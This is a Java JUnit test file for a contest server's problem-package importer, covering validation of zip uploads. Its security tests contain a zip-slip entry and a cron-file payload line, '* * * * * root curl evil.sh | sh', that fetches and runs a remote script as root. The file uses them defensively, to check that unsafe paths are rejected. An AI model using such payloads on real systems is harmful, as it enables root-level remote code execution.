package com.arbitrator.server.service;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Proxy;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicLong;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import com.arbitrator.common.dto.ProblemPackageResultDto;
import com.arbitrator.server.entity.Contest;
import com.arbitrator.server.entity.Problem;
import com.arbitrator.server.entity.TestCase;
import com.arbitrator.server.repo.ProblemRepository;
import com.arbitrator.server.repo.TestCaseRepository;

/**
 * S2-A2 validation suite (FR-05, FMEA-07). No database, no Spring context.
 *
 * Deliberately Mockito-free: Byte Buddy (pinned by the Spring Boot 3.2.5 BOM)
 * supports Java 22 at most, and a dev machine on a newer JDK cannot mock at
 * all. Hand-rolled fakes run on every JDK — see CLAUDE.md "things that bite".
 */
class ProblemPackageServiceTest {

    private ProblemPackageService service;
    /** Same fakes, but with a JdbcTemplate — the PDF path needs one. */
    private ProblemPackageService pdfService;
    private RecordingJdbc recordingJdbc;
    private List<TestCase> savedTests;
    private List<Problem> existingProblems;

    @BeforeEach
    void setUp() {
        savedTests = new ArrayList<>();
        existingProblems = new ArrayList<>();
        AtomicLong ids = new AtomicLong(10);

        ProblemRepository problems = fake(ProblemRepository.class, (name, args) -> switch (name) {
            case "findByContestIdOrderByOrderingAscCodeAsc" -> List.copyOf(existingProblems);
            case "save" -> {
                Problem p = (Problem) args[0];
                setId(p, ids.incrementAndGet());
                yield p;
            }
            default -> null;
        });

        TestCaseRepository testCases = fake(TestCaseRepository.class, (name, args) -> {
            if ("save".equals(name)) {
                savedTests.add((TestCase) args[0]);
                return args[0];
            }
            return null;
        });

        Contest contest = new Contest();
        contest.setTitle("Test Contest");
        setId(contest, 1L);
        // Concrete class, so a plain anonymous subclass stands in for it.
        ContestService contestService = new ContestService(null) {
            @Override
            public Contest requireCurrent() {
                return contest;
            }
        };

        service = new ProblemPackageService(problems, testCases, contestService, null, null);
        recordingJdbc = new RecordingJdbc();
        pdfService = new ProblemPackageService(problems, testCases, contestService,
                null, recordingJdbc);
    }

    // --- happy path ----------------------------------------------------

    @Test
    void validPackageIsImported() {
        ProblemPackageResultDto r = service.importPackage(validZip());

        assertTrue(r.accepted(), () -> "expected import, got: " + r.errors());
        assertEquals("A", r.code());
        assertEquals("Two Sum", r.title());
        assertEquals(2, r.testCaseCount());
        assertNotNull(r.problemId());
    }

    @Test
    void testCasesAreNumberedAscendingForFailFast() {   // BR-05
        service.importPackage(validZip());

        assertEquals(2, savedTests.size());
        assertEquals(1, savedTests.get(0).getIdx());
        assertEquals(2, savedTests.get(1).getIdx());
        assertEquals("2 3\n", savedTests.get(0).getInputData());
        assertEquals("5\n", savedTests.get(0).getExpectedOutput());
    }

    @Test
    void wrappingTopLevelDirectoryIsTolerated() {
        // what you get from "right-click folder -> Compress"
        Map<String, String> files = new LinkedHashMap<>();
        files.put("two-sum/config.json", CONFIG);
        files.put("two-sum/statement/statement.html", "<h1>A</h1>");
        files.put("two-sum/tests/01.in", "2 3\n");
        files.put("two-sum/tests/01.out", "5\n");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertTrue(r.accepted(), () -> "expected import, got: " + r.errors());
    }

    // --- validation failures (FMEA-07) ---------------------------------

    @Test
    void missingConfigIsRejected() {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("statement/statement.html", "<h1>A</h1>");
        files.put("tests/01.in", "2 3\n");
        files.put("tests/01.out", "5\n");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().get(0).contains("config.json"));
    }

    @Test
    void malformedConfigJsonIsRejected() {
        Map<String, String> files = baseFiles();
        files.put("config.json", "{ this is not json ");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().get(0).contains("not valid JSON"));
    }

    @Test
    void packageWithNoTestsIsRejected() {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("config.json", CONFIG);
        files.put("statement/statement.html", "<h1>A</h1>");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().stream().anyMatch(e -> e.contains("No test cases")));
    }

    @Test
    void inputWithoutMatchingOutputIsRejected() {
        Map<String, String> files = baseFiles();
        files.put("tests/02.in", "9 9\n");          // no 02.out

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().stream().anyMatch(e -> e.contains("02.in") && e.contains("02.out")));
    }

    @Test
    void orphanOutputIsRejected() {
        Map<String, String> files = baseFiles();
        files.put("tests/07.out", "42\n");          // no 07.in

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().stream().anyMatch(e -> e.contains("07.out") && e.contains("07.in")));
    }

    @Test
    void missingStatementIsRejected() {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("config.json", CONFIG);
        files.put("tests/01.in", "2 3\n");
        files.put("tests/01.out", "5\n");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().stream().anyMatch(e -> e.contains("No statement")));
    }

    /**
     * PDF statements used to be rejected outright (FR-05 allowed them all
     * along); V59 added storage and this asserts the new behaviour. The bytes
     * go to a side table via JdbcTemplate, so the fake below records that
     * insert instead of reaching a database.
     */
    @Test
    void pdfOnlyStatementIsAccepted() {
        Map<String, String> files = baseFiles();
        files.put("statement/statement.pdf", "%PDF-1.4 fake");
        files.remove("statement/statement.html");

        ProblemPackageResultDto r = pdfService.importPackage(zip(files));
        assertTrue(r.accepted(), () -> "rejected: " + r.errors());
        assertEquals(1, recordingJdbc.inserts, "the PDF bytes must be stored");
    }

    /** A package with neither an HTML nor a PDF statement is still rejected. */
    @Test
    void statementlessPackageIsStillRejected() {
        Map<String, String> files = baseFiles();
        files.remove("statement/statement.html");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().stream().anyMatch(e -> e.contains("No statement")));
    }

    /**
     * Concrete class, so an anonymous subclass rather than a Proxy — the
     * project's Mockito-free convention (see the class comment).
     */
    private static final class RecordingJdbc extends org.springframework.jdbc.core.JdbcTemplate {
        int inserts;

        @Override
        public int update(String sql, Object... args) {
            inserts++;
            return 1;
        }
    }

    @Test
    void absurdTimeLimitIsRejected() {
        Map<String, String> files = baseFiles();
        files.put("config.json", """
                {"code":"A","title":"Two Sum","timeLimitMs":999999,"memoryLimitKb":262144}""");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().stream().anyMatch(e -> e.contains("timeLimitMs")));
    }

    /**
     * "code" no longer comes from config.json at all — it is always the
     * problem's alphabetic position among the contest's problems, so a
     * second upload can never collide with the first regardless of what (if
     * anything) config.json says.
     */
    @Test
    void codeIsAlwaysTheNextAlphabeticPositionRegardlessOfConfigJson() {
        Problem existing = new Problem();
        existing.setCode("A");
        existing.setTitle("Already here");
        existingProblems.add(existing);

        ProblemPackageResultDto r = service.importPackage(validZip());
        assertTrue(r.accepted(), () -> "expected import, got: " + r.errors());
        assertEquals("B", r.code());
    }

    @Test
    void nothingIsPersistedWhenValidationFails() {
        Map<String, String> files = baseFiles();
        files.put("tests/02.in", "9 9\n");          // orphan -> rejected

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(savedTests.isEmpty(), "a rejected package must not write any test cases");
    }

    // --- security -------------------------------------------------------

    @Test
    void zipSlipEntryIsRejected() {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("config.json", CONFIG);
        files.put("statement/statement.html", "<h1>A</h1>");
        files.put("tests/01.in", "2 3\n");
        files.put("tests/01.out", "5\n");
        files.put("../../../../tmp/pwned.txt", "escaped!");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted(), "a path-traversal entry must be refused");
        assertTrue(r.errors().stream().anyMatch(e -> e.contains("Unsafe path")));
    }

    @Test
    void absolutePathEntryIsRejected() {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("config.json", CONFIG);
        files.put("/etc/cron.d/evil", "* * * * * root curl evil.sh | sh");

        ProblemPackageResultDto r = service.importPackage(zip(files));
        assertFalse(r.accepted());
        assertTrue(r.errors().stream().anyMatch(e -> e.contains("Unsafe path")));
    }

    @Test
    void nonZipInputIsRejectedGracefully() {
        ProblemPackageResultDto r =
                service.importPackage("I am definitely not a zip".getBytes(StandardCharsets.UTF_8));
        assertFalse(r.accepted());
        assertFalse(r.errors().isEmpty());
    }

    // --- helpers --------------------------------------------------------

    private static final String CONFIG = """
            {"code":"A","title":"Two Sum","timeLimitMs":2000,"memoryLimitKb":262144}""";

    private static Map<String, String> baseFiles() {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("config.json", CONFIG);
        files.put("statement/statement.html", "<h1>A. Two Sum</h1>");
        files.put("tests/01.in", "2 3\n");
        files.put("tests/01.out", "5\n");
        return files;
    }

    private static byte[] validZip() {
        Map<String, String> files = baseFiles();
        files.put("tests/02.in", "-1 1\n");
        files.put("tests/02.out", "0\n");
        return zip(files);
    }

    private static byte[] zip(Map<String, String> files) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(bos)) {
            for (Map.Entry<String, String> e : files.entrySet()) {
                zos.putNextEntry(new ZipEntry(e.getKey()));
                zos.write(e.getValue().getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
            }
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
        return bos.toByteArray();
    }

    /**
     * Minimal stand-in for a Spring Data interface: a dynamic proxy that
     * answers only the methods this service actually calls.
     */
    @SuppressWarnings("unchecked")
    private static <T> T fake(Class<T> iface, RepoHandler handler) {
        return (T) Proxy.newProxyInstance(
                iface.getClassLoader(),
                new Class<?>[] { iface },
                (proxy, method, args) -> handler.handle(method.getName(), args));
    }

    @FunctionalInterface
    private interface RepoHandler {
        Object handle(String method, Object[] args);
    }

    /** Entities expose no id setter by design; tests set it reflectively. */
    private static void setId(Object entity, Long id) {
        try {
            var f = entity.getClass().getDeclaredField("id");
            f.setAccessible(true);
            f.set(entity, id);
        } catch (ReflectiveOperationException e) {
            throw new IllegalStateException(e);
        }
    }
}
